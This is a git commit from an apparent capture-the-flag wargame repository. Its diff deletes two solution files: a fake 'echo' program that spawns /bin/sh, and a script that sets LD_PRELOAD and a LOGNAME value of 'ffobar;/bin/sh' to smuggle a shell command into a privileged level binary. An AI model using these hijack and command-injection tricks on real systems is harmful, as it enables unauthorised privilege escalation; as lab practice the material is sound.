1b1049108c77e644afc08fdd338aa58d28f18a81
Matthieu ARENE <marene@e1r1p6.42.fr>
2016-07-13 11:31:26 +0200

    renamed dirs

--- flag03/echo.c
+++
@@ -1,9 +0,0 @@
-#include <unistd.h>
-
-int		main()
-{
-	char*	args[] = {"/bin/sh", NULL};
-
-	execve(args[0], args, NULL);
-	return (0);
-}
--- flag07/run.sh
+++
@@ -1,4 +0,0 @@
-#!/bin/sh
-export LD_PRELOAD="/tmp/libtutu.so"
-export LOGNAME="ffobar;/bin/sh"
-~/level07
